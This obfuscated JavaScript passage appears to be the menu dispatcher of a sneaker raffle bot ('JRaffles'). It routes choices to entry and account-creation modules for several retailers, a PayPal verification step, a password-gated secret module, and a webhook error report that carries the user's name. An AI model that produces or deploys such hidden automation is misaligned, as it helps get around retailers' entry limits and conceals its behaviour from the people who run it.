                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x16913c['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x16913c['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x16913c['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x16913c['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x58d31a();
                if (taskModule > _0x16913c['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x9175f4(0x3e8), _0x2188f4();
                if (_0x16913c[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                    var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x1d6802 = await _0x4dde3f();
                            await _0x245657['function'](_0x245657, _0x1d6802);
                        }
                        if (taskFunction == 0x2) {
                            var _0x1d6802 = await _0x4dde3f(), _0x29cbd4 = await _0x13f2f2(_0x245657);
                            _0x263298['shuffleTasks'] && await _0x46aee0(_0x29cbd4), await _0x245657['function'](_0x245657, _0x29cbd4, _0x1d6802);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x1d6802 = await _0x4dde3f(), _0x29cbd4 = await _0x13f2f2(_0x245657);
                                _0x263298['shuffleTasks'] && await _0x46aee0(_0x29cbd4), await _0x245657['function'](_0x245657, _0x29cbd4, _0x1d6802);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x1d6802 = await _0x4dde3f();
                                    await _0x245657['function'](_0x245657, _0x1d6802);
                                }
                            }
                        }
                    } catch (_0x3a57e7) {
                        console['log'](_0x3a57e7), await _0x9175f4(0x7d0);
                    }
                    return _0x2188f4();
                }
                if (_0x16913c[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                        var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x1d6802 = await _0x4dde3f(), _0x326ce9 = await _0x13f2f2(_0x245657);
                            _0x263298['shuffleTasks'] && await _0x46aee0(_0x326ce9), await _0x245657['function'](_0x245657, _0x326ce9, _0x1d6802);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x1d6802 = await _0x4dde3f(), _0x326ce9 = await _0x13f2f2(_0x245657);
                                _0x263298['shuffleTasks'] && await _0x46aee0(_0x326ce9), await _0x245657['function'](_0x245657, _0x326ce9, _0x1d6802);
                            }
                        }
                    } catch (_0x3ecda9) {
                        console['log'](_0x3ecda9), await _0x9175f4(0xfa0);
                    }
                    return _0x2188f4();
                }
                if (_0x16913c[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                        var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x1d6802 = await _0x4dde3f(), _0x326ce9 = await _0x13f2f2(_0x245657);
                            _0x263298['shuffleTasks'] && await _0x46aee0(_0x326ce9), await _0x245657['function'](_0x245657, _0x326ce9, _0x1d6802);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x1d6802 = await _0x4dde3f(), _0x326ce9 = await _0x13f2f2(_0x245657);
                                _0x263298['shuffleTasks'] && await _0x46aee0(_0x326ce9), await _0x245657['function'](_0x245657, _0x326ce9, _0x1d6802);
                            }
                        }
                    } catch (_0x3d719a) {
                        console['log'](_0x3d719a), await _0x9175f4(0xfa0);
                    }
                    return _0x2188f4();
                }
                if (_0x16913c[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                    var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x1d6802 = await _0x4dde3f();
                        return await _0x245657['function'](_0x245657, _0x1d6802), _0x2188f4();
                    }
                    var _0x1d6802 = await _0x4dde3f(), _0x2158c = await _0x13f2f2(_0x245657);
                    return _0x263298['shuffleTasks'] && await _0x46aee0(_0x2158c), await _0x245657['function'](_0x245657, _0x2158c, _0x1d6802), _0x2188f4();
                }
                if (_0x16913c[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                    var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x1d6802 = await _0x4dde3f(), _0x2158c = await _0x13f2f2(_0x245657);
                    return _0x263298['shuffleTasks'] && await _0x46aee0(_0x2158c), await _0x245657['function'](_0x245657, _0x2158c, _0x1d6802), _0x2188f4();
                }
                if (_0x16913c[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                    var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x1d6802 = await _0x4dde3f(), _0x2158c = await _0x13f2f2(_0x245657);
                    return _0x263298['shuffleTasks'] && await _0x46aee0(_0x2158c), await _0x245657['function'](_0x245657, _0x2158c, _0x1d6802), _0x2188f4();
                }
                if (_0x16913c[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                    var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x1d6802 = await _0x4dde3f(), _0x2158c = await _0x13f2f2(_0x245657);
                    return _0x263298['shuffleTasks'] && await _0x46aee0(_0x2158c), await _0x245657['function'](_0x245657, _0x2158c, _0x1d6802), _0x2188f4();
                } else {
                    if (_0x16913c[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                        var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x1d6802 = await _0x4dde3f(), _0x540027 = await _0x13f2f2(_0x245657);
                            return _0x263298['shuffleTasks'] && await _0x46aee0(_0x540027), await _0x245657['function'](_0x245657, _0x540027, _0x1d6802), _0x2188f4();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x1d6802 = await _0x4dde3f();
                                return await _0x245657['function'](_0x245657, null, _0x1d6802), _0x2188f4();
                            }
                        }
                        ;
                    } else {
                        if (_0x16913c[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                            var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction], _0x1d6802 = await _0x4dde3f(), _0x2f877e = await _0x13f2f2(_0x245657);
                            return _0x263298['shuffleTasks'] && await _0x46aee0(_0x2f877e), await _0x245657['function'](_0x245657, _0x2f877e, _0x1d6802), await _0x9175f4(0x1388), _0x2188f4();
                        } else {
                            if (_0x16913c[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                                var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x1d6802 = await _0x4dde3f(), _0x540027 = await _0x13f2f2(_0x245657);
                                    return _0x263298['shuffleTasks'] && await _0x46aee0(_0x540027), await _0x245657['function'](_0x245657, _0x540027, _0x1d6802), _0x2188f4();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x1d6802 = await _0x4dde3f();
                                        return await _0x245657['function'](_0x245657, null, _0x1d6802), _0x2188f4();
                                    }
                                }
                                ;
                            } else {
                                if (_0x16913c[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                                    var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x245657);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x16913c[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                                        var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x1d6802 = await _0x4dde3f(), _0x19f1e7 = await _0x13f2f2(_0x245657);
                                            return _0x263298['shuffleTasks'] && await _0x46aee0(_0x19f1e7), await _0x245657['function'](_0x245657, _0x19f1e7, _0x1d6802), _0x2188f4();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x1d6802 = await _0x4dde3f(), _0x19f1e7 = await _0x13f2f2(_0x245657);
                                                return _0x263298['shuffleTasks'] && await _0x46aee0(_0x19f1e7), await _0x245657['function'](_0x245657, _0x19f1e7, _0x1d6802), _0x2188f4();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x16913c[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                                            var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x1d6802 = await _0x4dde3f(), _0x98447b = await _0x13f2f2(_0x245657);
                                                return _0x263298['shuffleTasks'] && await _0x46aee0(_0x98447b), await _0x245657['function'](_0x245657, _0x98447b, _0x1d6802), _0x2188f4();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x1d6802 = await _0x4dde3f(), _0x98447b = await _0x13f2f2(_0x245657);
                                                    return _0x263298['shuffleTasks'] && await _0x46aee0(_0x98447b), await _0x245657['function'](_0x245657, _0x98447b, _0x1d6802), _0x2188f4();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x16913c[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                                                var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x1d6802 = await _0x4dde3f(), _0x251a58 = await _0x13f2f2(_0x245657);
                                                    return _0x263298['shuffleTasks'] && await _0x46aee0(_0x251a58), await _0x245657['function'](_0x245657, _0x251a58, _0x1d6802), _0x2188f4();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x1d6802 = await _0x4dde3f(), _0x251a58 = await _0x13f2f2(_0x245657);
                                                        return _0x263298['shuffleTasks'] && await _0x46aee0(_0x251a58), await _0x245657['function'](_0x245657, _0x251a58, _0x1d6802), _0x2188f4();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x16913c[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                                                    var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x1d6802 = await _0x4dde3f(), _0x5e9320 = await _0x13f2f2(_0x245657);
                                                        return _0x263298['shuffleTasks'] && await _0x46aee0(_0x5e9320), await _0x245657['function'](_0x245657, _0x5e9320, _0x1d6802), _0x2188f4();
                                                    }
                                                } else {
                                                    if (_0x16913c[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x9175f4(0x3e8), _0x2188f4();
                                                    else {
                                                        if (_0x16913c[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x5fc88c = _0x16913c[taskModule]['name'], _0x1d6802 = await _0x4dde3f();
                                                            return await _0x4f7ebf(_0x5fc88c, _0x1d6802), _0x2188f4();
                                                        } else {
                                                            if (_0x16913c[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x37ee1c(_0x16913c[taskModule]['modules']);
                                                                var _0x245657 = _0x16913c[taskModule]['modules'][taskFunction];
                                                                return await _0x245657['function'](_0x245657), _0x2188f4();
                                                            } else {
                                                                if (_0x16913c[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x342f9a = 0x0;
                                                                    for (const _0x240e25 in _0x263298) {
                                                                        console['log']('(' + _0x342f9a + ')\x20' + _0x240e25 + '\x20:\x20' + _0x263298[_0x240e25]), _0x342f9a++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x342f9a + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x368488 = await _0x77d245();
                                                                    if (_0x368488 == _0x342f9a)
                                                                        return _0x2188f4();
                                                                    console['clear'];
                                                                    var _0x487e2c = 0x0;
                                                                    for (var _0x3bdc0f in _0x263298) {
                                                                        if (_0x368488 == _0x487e2c) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x3bdc0f + '\x20:'), _0x263298[_0x3bdc0f] = await _0x4429a3(), _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298));
                                                                            break;
                                                                        } else
                                                                            _0x487e2c++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x9175f4(0xbb8), _0x2188f4();
                                                                } else {
                                                                    if (_0x16913c[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x285121(), _0x2188f4();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x16913c[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x90cb38 = await _0x1fdc4c();
                                                                            _0x90cb38 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x6b8f3(), await afewFunction(_0x2bb746[_0x5d9319], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x9175f4(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x2188f4();
            } catch (_0x39efd5) {
                return console['log'](_0x39efd5), _0x2188f4();
            }
        } catch (_0x3ab466) {
            return console['log'](_0x3ab466), await _0x9175f4(0x3a98);
        }
}
;
_0x73a448('JRaffles\x20' + _0x5ab5b1), _0x285121();
try {
    _0x2110df();
} catch (_0x1347e7) {
    var _0x3faa24 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x100f6f
            },
            {
                'name': 'Version',
                'value': '' + _0x5ab5b1
            },
            {
                'name': 'Error',
                'value': '' + _0x1347e7
            }
        ]
    }];
    const _0x590cc5 = { 'embeds': _0x3faa24 };
    _0x1cac9f(_0x569bf6, _0x590cc5);
}